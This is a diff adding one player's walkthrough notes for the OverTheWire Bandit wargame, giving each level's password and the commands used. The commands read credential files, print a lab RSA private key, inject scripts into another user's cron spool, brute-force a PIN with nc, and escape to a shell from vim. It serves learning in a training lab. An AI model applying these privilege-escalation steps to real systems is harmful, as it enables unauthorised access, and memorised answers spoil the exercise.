@@ -1,0 +1,218 @@
+Level 0 - ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If
+	• In bandit0/readme.
+	
+Level 1 - 263JGJPfgU6LtdEvgfWU1XP5yac29mFx
+	• cat ./-
+	
+Level 2 - MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx
+	• cat 'spaces in this filename'
+	
+Level 3 - 2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ
+	• cd inhere/
+	• cat ...Hiding-From-You
+	
+Level 4 - 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw
+	• file inhere/*
+	• cat inhere/-file07
+
+Level 5 - HWasnPhtq9AVKe0dmk45nxy20cvUa6EG
+	• du -h -a --bytes inhere | sort
+	• Found the file with 1033 bytes.
+	• (find inhere -type f -size 1033c) - not my solution…
+
+Level 6 - morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj
+	• ll / -R | grep 'bandit7 bandit6' (add -> '2>/dev/null' to remove permission denied results)
+	• find / | grep bandit7.password
+	• cat /var/lib/dpkg/info/bandit7.password
+
+Level 7 - dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc
+	• cat data.txt | grep millionth OR USE strings data.txt | grep millionth
+
+Level 8 - 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM
+	• cat data.txt | sort | uniq -c | grep '1 ' OR USE cat data.txt | sort | uniq -u
+
+Level 9 - FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey
+	• strings data.txt | grep "===*" OR ADD " | tr -d '====== \n' "
+
+Level 10 -  dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr
+	• base64 -d data.txt
+
+Level 11 - 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4
+	• cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'
+
+Level 12 - FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn
+	• mktemp -d
+	• cd to folder
+	• cp data.txt /tmp/tmp.QkJAMUWW2
+	• xxd -r data.txt > new_data.gz
+	• gzip -d new_data.gz
+	• gzip -d new_data.gz
+	• tar -xvf new_data.tar
+	• tar -xvf data5.bin
+	• tar -xvf data6.tar
+	• gzip -d data8.gz
+	• cat data8
+	
+Level 13 - MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
+	• ssh bandit14@localhost -p 2220 -I sshkey.private 
+	• cat /etc/bandit_pass/bandit14
+
+Level 14 - 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
+	• Telnet localhost 30000
+	• MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
+	
+
+Level 15 - kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
+	• Openssl s_client localhost:30001 
+	• 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
+	
+Level 16 - 
+	• nmap localhost -p31000-32000
+	• openssl s_client -connect localhost:31790 -nocommands (important since keys may start with 'k' / 'R' / 'Q')
+	-----BEGIN RSA PRIVATE KEY-----
+	MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+	imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+	Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+	DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+	JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+	x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+	KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+	J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+	d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+	YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+	vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+	+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+	8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+	SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+	HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+	SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+	R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+	Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+	R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+	L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+	blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+	YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+	77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+	dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+	vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+	-----END RSA PRIVATE KEY-----
+	• mktemp -d 
+	• Paste key to next
+	• Chmod 700 next
+	• ssh bandit17@localhost -p 2220 -i next
+
+Level 17 - x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
+	• diff passwords.old passwords.new
+
+Level 18 - cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
+	• ssh bandit18@bandit.labs.overthewire.org -p 2220 command cat readme
+
+Level 19 - 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+	• ./bandit20-do cat /etc/bandit_pass/bandit20
+
+Level 20 - EeoULMCra2q0dSkYj561DX7s1CpBuOBt
+		• Nmap localhost -p1-35000
+		• Find port that’s not in use! (I used 30123)
+		• Connect to bandit20 in second tab.
+		• Run "nc -l -p 30123" on second tab.
+		• Run "./suconnect 30123" on first tab.
+		• Enter code in second tab - 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+		
+Level 21 - tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+	• Cd /etc/cron.d
+	• cat cronjob_bandit22
+	• cat /usr/bin/cronjob_bandit22.sh
+	• cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv (generates every 10 minutes - in random file)
+	
+Level 22 - 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+	• cd /etc/cron.d
+	• cat cronjob_bandit23
+	• cat /usr/bin/cronjob_bandit23.sh
+	• run code line by line - modify '$(whoami)' to 'bandit23'.
+	• cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+
+Level 23 - gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+	• cat /etc/cron.d/cronjob_bandit24
+	• cat /usr/bin/cronjob_bandit24.sh
+	• cd $(mktemp -d)
+	• touch password.txt
+	• nano script.sh:
+		#!/bin/bash
+		cat /etc/bandit_pass/bandit24 > /tmp/tmp.qSxs4YvyxF/password.txt
+	• chmod -r 777 .
+	• cp script.sh /var/spool/bandit24/foo
+	• cat password.txt
+
+Level 24 - iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+	• cd $(mktemp -d)
+	• touch password.txt
+	• chmod 777 password.txt script.sh (after creating it…)
+	• nano script.sh:
+	#!/bin/bash
+	
+	echo "" > password.txt
+	i=1
+	while [ $i -lt 10000 ];
+	do
+	        echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> password.txt
+	        let i=i+1
+	done
+	cat password.txt | nc localhost 30002 | uniq
+	• Pin was 3947
+	
+Level 25 - s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
+	• Shrink window (so more won't reach bottom of page!)
+	• Press 'v' (to enter command mode using vim)
+	• ":shell=/bin/bash"
+	• Esc
+	• ":shell"
+	• whoami (varify im bandit26!)
+	• cat etc/bandit_pass/bandit26
+
+Level 26 - upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
+	• ./bandit27-do cat /etc/bandit_pass/bandit27
+	
+
+Level 27 - Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
+	• cd $(mktemp -d)
+	• git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
+
+Level 28 - 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7
+	• cd $(mktemp -d)
+	• git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
+	• git log --graph --oneline --all
+	• git checkout 73f5d04 (add missing data)
+
+Level 29 - qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL
+	• cd $(mktemp -d)
+	• git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
+	• git log --graph --oneline --all
+	• git checkout eef5340 (add missing data)
+	
+
+Level 30 - fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
+	• cd $(mktemp -d)
+	• git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
+	• git log --graph --oneline --all
+	• git tag
+	• git show secret
+
+Level 31 - 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K
+	• cd $(mktemp -d)
+	• git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
+	• git log --graph --oneline --all
+	• Nano .igitignore:
+         (remove .txt)
+	• Nano key.txt:
+		May I come in?
+	• Git add key.txt
+	• Git commit -m "Add key.txt"
+	• Git push origin master
+
+Level 32 - tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
+	• $0 (which script is running - and opens a separate shell for me to use / may use sh -c $0)
+	• Whoami (bandit33)
+	• cat /etc/bandit_pass/bandit33
+
+Level 33 - END OF GAME!
+
